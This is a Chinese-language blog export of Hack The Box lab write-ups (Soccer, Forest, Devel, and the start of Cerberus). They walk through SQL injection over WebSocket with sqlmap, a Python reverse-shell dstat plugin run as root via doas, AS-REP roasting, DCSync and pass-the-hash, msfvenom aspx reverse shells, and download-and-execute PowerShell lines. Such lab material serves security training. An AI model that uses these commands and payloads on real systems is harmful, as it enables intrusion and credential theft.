    payload <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>self<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">.</span>query<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
   <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token boolean">False</span>
    
   <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
    content <span class="token operator">=</span> send_ws<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
   <span class="token keyword">else</span><span class="token punctuation">:</span>
    content <span class="token operator">=</span> <span class="token string">'No parameters specified!'</span>

   self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span> content_type<span class="token punctuation">)</span>
   self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
   self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
   <span class="token keyword">return</span>

 <span class="token keyword">class</span> <span class="token class-name">_TCPServer</span><span class="token punctuation">(</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>
  allow_reuse_address <span class="token operator">=</span> <span class="token boolean">True</span>

 httpd <span class="token operator">=</span> _TCPServer<span class="token punctuation">(</span>host_port<span class="token punctuation">,</span> CustomHandler<span class="token punctuation">)</span>
 httpd<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Starting MiddleWare Server"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Send payloads in http://localhost:8081/?id=*"</span><span class="token punctuation">)</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
 middleware_server<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">8081</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
 <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先运行脚本，后开启sqlmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sqlmap -u "http://localhost:8081/?id=1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213161248274.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213161735481.png"></p>
<p>死活测不出来，后面升级sqlmap，还不行，盯了两天，看了好几个大佬的思路，确定这个sql注入是必经之路，无奈，只能白嫖大佬的注入结果（如有大佬有思路，烦请指点一二）</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sqlmap -u “http://localhost:8081/?id="
sqlmap -u “http://localhost:8081/?id=" --current-db
sqlmap -u “http://localhost:8081/?id=" -D soccer_db --tables
sqlmap -u "http://localhost:8081/?id=" -D soccer_db -T accounts --dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">+------+-------------------+----------+----------------------+
| id   | email             | username | password             |
+------+-------------------+----------+----------------------+
| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |
+------+-------------------+----------+----------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后SSH连上这个player用户</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230215095448809.png"></p>
<h2 id="七、doas和dstat联动提权"><a href="#七、doas和dstat联动提权" class="headerlink" title="七、doas和dstat联动提权"></a>七、doas和dstat联动提权</h2><p>接下来就是提权，我们用doas和dstat联动提权</p>
<p><a href="https://man.openbsd.org/doas">doas</a>：以其他用户身份执行命令，系统管理员可以对其进行设定，赋予指定使用者执行特定指令的权限。</p>
<p><a href="https://linux.die.net/man/1/dstat">dstat</a>：用于生成系统资源统计信息的多功能工具。</p>
<p>关键点就在于用户可以给dstat添加查看系统资源的脚本文件，我们可以在脚本文件中利用socket来建立连接，从而获取shell。</p>
<p>我们用下列查找命令，可以发现靶机包含dstat工具</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">find / -type d -name dstat 2&gt;/dev/null	<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注：由于find在匹配查找过程中，会有部分目录无可读权限，从而会产生“Permission denied”的错误提示，此处“2&gt;/dev/null”是为了过滤掉这些提示，简化输出结果。“2&gt;/dev/null”表示重定向错误提示信息（stderr）到“/dev/null”，“/dev/null”是一个不存在的空设备。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230215100431891.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230215210503946.png"></p>
<p>可以看到dstat文件的格式都是dstat_*.py</p>
<p>官方给出的可能包含外部dstat_*.py插件的目录有如下几个</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">~/.dstat/
(path of binary)/plugins/
/usr/share/dstat/
/usr/local/share/dstat/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以在/usr/local/share/dstat目录新建dstat_wa0er.py，内容如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>
s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"10.10.16.15"</span><span class="token punctuation">,</span><span class="token number">3030</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">#此处ip及端口依然对应开启监听的主机和端口</span>

os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> pty<span class="token punctuation">;</span> pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开启端口监听</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -nvlp 3030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>借助doas，以root身份执行dstat命令，从而执行dstat_wa0er.py</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">doas -u root /usr/bin/dstat --wa0er<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230215165010075.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230215164918441.png"></p>
<p>可以看到，我们成功拿到root权限</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://systemweakness.com/soccer-hack-the-box-f02665c71abe">Soccer — Hack The Box</a></p>
<p><a href="https://infosecwriteups.com/soccer-hack-the-box-writeup-with-flag-2023-de695a0e54ec">Hack The Box — Soccer Machine Simple Writeup by Karthikeyan Nagaraj</a></p>
<p><a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">Automating Blind SQL injection over WebSocket</a></p>
<p><a href="https://github.com/rayhan0x01/nodejs-websocket-sqli">NodeJS WebSocket SQLi vulnerable WebApp</a></p>
<p><a href="https://man.openbsd.org/doas.conf.5">doas</a></p>
<p><a href="https://linux.die.net/man/1/dstat">dstat</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Tiny File Manager弱口令</tag>
        <tag>文件上传</tag>
        <tag>ngnix</tag>
        <tag>WebSocket实现SQL注入</tag>
        <tag>doas和dstat联动提权</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Forest</title>
    <url>/posts/9ab855b5.html</url>
    <content><![CDATA[<h1 id="HTB-Forest"><a href="#HTB-Forest" class="headerlink" title="HTB-Forest"></a>HTB-Forest</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>主要工具：</p>
<p>rpcclient：建立null session并执行enumdomusers列举域内用户</p>
<p>ldapsearch：列举域内用户</p>
<p>impacket-GetNPUsers：枚举用户信息</p>
<p>crackmapexec：登录smb或winrm服务</p>
<p>evil-winrm：登录winrm服务</p>
<p>bloodhound-python：获取Active Directory信息</p>
<p>impacket-secretsdump：把Administrator的hash给dump下来（hash转储）</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap扫描</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -A 10.10.10.161<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801104930654.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801104953705.png"></p>
<p>开放的端口服务挺多的，避免遗漏，再用如下命令扫一遍</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -p- --min-rate 10000 -Pn -sT 10.10.10.161
nmap -p- --min-rate 10000 -Pn -sU 10.10.10.161<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801170650296.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801170707492.png"></p>
<h2 id="三、RPCBind"><a href="#三、RPCBind" class="headerlink" title="三、RPCBind"></a>三、RPCBind</h2><p>用rpcclient建立null session（即不需要用户名和口令），并执行命令列举域内用户</p>
<pre class="line-numbers language-none"><code class="language-none">rpcclient -U "" -N -c enumdomusers 10.10.10.161<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801105118398.png"></p>
<p>其中有一些<code>SM_</code>和<code>HealthMailbox</code>开头的用户是微软Exchange邮件服务相关用户，可以忽略</p>
<p>另一种列举域内用户的方法是用ldapsearch，如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">ldapsearch -x -b "dc=htb,dc=local" "*" -H ldap://10.10.10.161 | grep userPrincipalName -T<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801105613019.png"></p>
<p>然后我们把用户保存到一个txt文件中</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801141741999.png"></p>
<h2 id="四、AS-REP-Roasting"><a href="#四、AS-REP-Roasting" class="headerlink" title="四、AS-REP Roasting"></a>四、AS-REP Roasting</h2><p>用impacket-GetNPUsers枚举用户信息</p>
<pre class="line-numbers language-none"><code class="language-none">impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.10.10.161<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801141710900.png"></p>
<p>获取到svc-alfresco用的的hash，保存到一个txt文件中</p>
<pre class="line-numbers language-none"><code class="language-none">$krb5asrep$23$svc-alfresco@HTB.LOCAL:0f16da7878199001a313c8d8fa5f4954$c12e97e4c0dc193904026abe565b276765c563f613e0a802e4ab5b567c6dc280194233cbbdc40813f6419cbb3072815f488be8c4af44646a46c02119c901099b34a562e0f18751b39b2de2ef108a5ee09d9131849e9fe5169e51ee585ae604810cd154f010fbd3b6a00c31e982ff23242c86d4e00c3c0e97ada71e93241f798e6ca453b3850807795d2b7910c7cfb56a9ec53b5b1425470b9a9408bb71c02456f7540c7d9d9c48687cc935a99d8c9799e0ad16022119ce88ecb84666393d1c91bdf26470464171641c6525c5d3026ce06bed360a6ca93305275419d1f478f10a92a8d006a23e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>用john指定字典，爆破hash</p>
<pre class="line-numbers language-none"><code class="language-none">john -w=/usr/share/wordlists/rockyou.txt hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801141949973.png"></p>
<p>爆破成功，用户名及口令已知，用crackmapexec验证此账户</p>
<pre class="line-numbers language-none"><code class="language-none">crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice -d htb.local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801142225862.png"></p>
<p>验证成功，确认此账户正确</p>
<h2 id="五、WinRM"><a href="#五、WinRM" class="headerlink" title="五、WinRM"></a>五、WinRM</h2><p>然后把smb更换成winrm，看是否有登录winrm服务的权限</p>
<pre class="line-numbers language-none"><code class="language-none">crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice -d htb.local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801142320010.png"></p>
<p>确实有winrm服务的权限，用evil-winrm登录，如下图，登录成功</p>
<pre class="line-numbers language-none"><code class="language-none">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801142524093.png"></p>
<h2 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h2><p>用bloodhound-python获取Active Directory信息</p>
<pre class="line-numbers language-none"><code class="language-none">bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 --zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801144028757.png"></p>
<p>添加新用户wa0er，并把用户放到”Exchange Windows Permissions”用户组和”Remote Management Users”用户组</p>
<pre class="line-numbers language-none"><code class="language-none">net user wa0er password /add /domain
net group "Exchange Windows Permissions" wa0er /add
net localgroup "Remote Management Users" wa0er /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801150152253.png"></p>
<p>验证用户有效性</p>
<pre class="line-numbers language-none"><code class="language-none">crackmapexec smb 10.10.10.161 -u wa0er -p 'password' -d htb.local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801150244367.png"></p>
<p>写DACL</p>
<p>本地kali开启http.server服务</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>靶机evil-winrm窗口依次执行如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">(New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1') | IEX
$SecPass = ConvertTo-SecureString 'password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\wa0er', $SecPass)
Add-ObjectACL -PrincipalIdentity wa0er -Credential $Cred -Rights DCSync<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在用户wa0er有了DCSync权限</p>
<p>用impacket-secretsdump把Administrator的hash给dump下来（hash转储）</p>
<pre class="line-numbers language-none"><code class="language-none">impacket-secretsdump htb.local/wa0er@10.10.10.161 -just-dc-user Administrator -just-dc-ntlm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801152453337.png"></p>
<p>用crackmapexec和传递Administrator的hash，执行命令</p>
<pre class="line-numbers language-none"><code class="language-none">crackmapexec smb 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -d htb.local -x "dir C:\Users\Administrator\Desktop"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801153226732.png"></p>
<p>会有一些报错，但无伤大雅</p>
<p>可看到成功以Administrator身份执行任意命令</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801153337903.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://axcheron.github.io/writeups/htb/forest/">https://axcheron.github.io/writeups/htb/forest/</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>winrm</tag>
        <tag>rpcclient</tag>
        <tag>ldapsearch</tag>
        <tag>impacket</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Devel</title>
    <url>/posts/97f065fe.html</url>
    <content><![CDATA[<h1 id="HTB-Devel"><a href="#HTB-Devel" class="headerlink" title="HTB-Devel"></a>HTB-Devel</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.端口扫描发现存在可匿名登录的FTP服务，主页响应包发现是ASP.NET语言；</p>
<p>2.msfvenom制作aspx木马反弹shell；</p>
<p>3.systeminfo发现windows 7 build 7600没打补丁；</p>
<p>4.MS11-046提权。</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap端口扫描</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731093127132.png"></p>
<p>开放端口：21（ftp）、80（http），其中ftp允许匿名登录</p>
<p>浏览器访问靶机IP，主页如下，访问<code>iisstart.htm</code>页面一样</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731100023079.png" style="zoom: 80%;">

<p>Burp抓包可看到响应包中<code>X-Powered-By</code>字段值，说明网站使用ASP.NET语言，可以尝试ftp传一个aspx的木马</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731100304986.png"></p>
<p>在本地kali查找aspx木马，此处选择用seclists的（seclists是github的一个开源字典项目）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731100452176.png"></p>
<p>如下命令复制到当前目录</p>
<pre class="line-numbers language-none"><code class="language-none">cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>匿名连接FTP服务并上传aspx木马</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731101346524.png"></p>
<p>查看，木马被传到网站根目录</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731111707297.png"></p>
<p>访问木马，执行命令成功，接下来用msfvenom生成aspx木马反弹shell</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731101601339.png"></p>
<h2 id="三、msfvenom制作aspx木马反弹shell"><a href="#三、msfvenom制作aspx木马反弹shell" class="headerlink" title="三、msfvenom制作aspx木马反弹shell"></a>三、msfvenom制作aspx木马反弹shell</h2><p>可用如下命令查看支持的格式和payload</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom --list formats
msfvenom --list payloads | grep 'shell_reverse_tcp'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>制作反弹shell木马</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.5 LPORT=9898 -o reverse-shell.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731162021240.png"></p>
<p>用FTP上传</p>
<pre class="line-numbers language-none"><code class="language-none">ftp&gt; put reverse-shell.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地kali开启nc监听<code>nc -lvnp 9898</code></p>
<p>浏览器访问：<a href="http://10.10.10.5/reverse-shell.aspx%EF%BC%8C%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96shell">http://10.10.10.5/reverse-shell.aspx，成功获取shell</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731112020334.png"></p>
<p>执行systeminfo命令查看主机信息，Win7 Build 7600没打补丁</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731112600263.png"></p>
<p>google搜索关键字：microsoft windows 7 build 7600 exploit</p>
<p><a href="https://www.exploit-db.com/exploits/40564">https://www.exploit-db.com/exploits/40564</a></p>
<p>EDB-ID是40564</p>
<h2 id="四、MS11-046提权"><a href="#四、MS11-046提权" class="headerlink" title="四、MS11-046提权"></a>四、MS11-046提权</h2><p>本地kali执行如下命令更新exploit数据库并查找EDB-ID为40564的exploit</p>
<pre class="line-numbers language-none"><code class="language-none">searchsploit -u
searchsploit -m 40564<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731152602328.png"></p>
<p>apt下载mingw-w64</p>
<pre class="line-numbers language-none"><code class="language-none">apt update
apt install mingw-w64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>编译40564.c</p>
<pre class="line-numbers language-none"><code class="language-none">i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地kali开启http服务</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>靶机执行如下命令，下载编译好的40564.exe（执行命令后，稍等一分钟按一下回车）</p>
<pre class="line-numbers language-none"><code class="language-none">powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5:80/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可看到40564.exe已被下载到靶机</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731143439853.png"></p>
<p>执行40564.exe，成功提权，Over！</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731143504437.png"></p>
<pre class="line-numbers language-none"><code class="language-none">flag位置
c:\Users\babis\Desktop\user.txt
c:\Users\Administrator\Desktop\root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731144353440.png" style="zoom: 80%;">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/devel-writeup-w-o-metasploit">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/devel-writeup-w-o-metasploit</a></p>
<p><a href="https://0xdf.gitlab.io/2019/03/05/htb-devel.html">https://0xdf.gitlab.io/2019/03/05/htb-devel.html</a></p>
<h2 id="另一种以MSF为主的getshell、提权思路"><a href="#另一种以MSF为主的getshell、提权思路" class="headerlink" title="另一种以MSF为主的getshell、提权思路"></a>另一种以MSF为主的getshell、提权思路</h2><p>本地kali制作aspx木马</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=9899 -f aspx -o met_rev_9899.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ftp上传木马</p>
<pre class="line-numbers language-none"><code class="language-none">ftp&gt; put met_rev_9899.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>启动MSF执行如下命令进行监听</p>
<pre class="line-numbers language-none"><code class="language-none">msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 9899
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>新开一个终端执行如下命令访问aspx木马</p>
<pre class="line-numbers language-none"><code class="language-none">curl http://10.10.10.5/met_rev_9899.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可看到成功getshell</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731162558815.png"></p>
<p>把shell会话（此处为session 1）放到后台，并查看可利用的exploit</p>
<pre class="line-numbers language-none"><code class="language-none">background
use post/multi/recon/local_exploit_suggester
set session 1
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731170408487.png"></p>
<p>用ms10-015模块提权</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit/windows/local/ms10_015_kitrap0d
set lhost tun0
set lport 9900
set session 1
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230731164942777.png"></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>匿名FTP</tag>
        <tag>ASP.NET</tag>
        <tag>msfvenom</tag>
        <tag>aspx木马</tag>
        <tag>MS11-046提权</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Cerberus</title>
    <url>/posts/7761233f.html</url>
    <content><![CDATA[<h1 id="HTB-Cerberus"><a href="#HTB-Cerberus" class="headerlink" title="HTB-Cerberus"></a>HTB-Cerberus</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.信息收集找到icinga服务；</p>
<p>2.CVE-2022-24716（目录遍历）发现域控主机和icinga账户；</p>
<p>3.CVE-2022-24715（RCE）获取www-data用户权限，linpeas分析发现/usr/bin/firejail；</p>
<p>4.CVE-2022-31214（Firejail本地提权）获取root权限，并读取SSSD缓存找到域控账户；</p>
<p>5.fscan扫域控主机端口发现5985（Winrm服务）；</p>
<p>6.chisel做代理将5985端口流量代理到本地，用evil-winrm登录域控主机；</p>
<p>7.发现ManageEngine ADSelfService Plus服务，chisel做socks代理，访问9251服务，MSF提权。</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>Nmap</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -A 10.10.11.205<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724172327113.png"></p>
<p>开放端口8080，URL：<a href="http://icinga.cerberus.local:8080/icingaweb2">http://icinga.cerberus.local:8080/icingaweb2</a></p>
<p>添加域名到hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.205 icinga.cerberus.local" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问URL，界面如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230720164559795.png"></p>
<h2 id="三、CVE-2022-24716（目录遍历）"><a href="#三、CVE-2022-24716（目录遍历）" class="headerlink" title="三、CVE-2022-24716（目录遍历）"></a>三、CVE-2022-24716（目录遍历）</h2><p>google搜索关键字：icinga exploit</p>
<p>CVE-2022-24716：<a href="https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/">https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/</a></p>
<p>访问：<a href="http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts">http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts</a></p>
<p>确认存在目录遍历，且可看到有域控，IP为172.16.22.1</p>
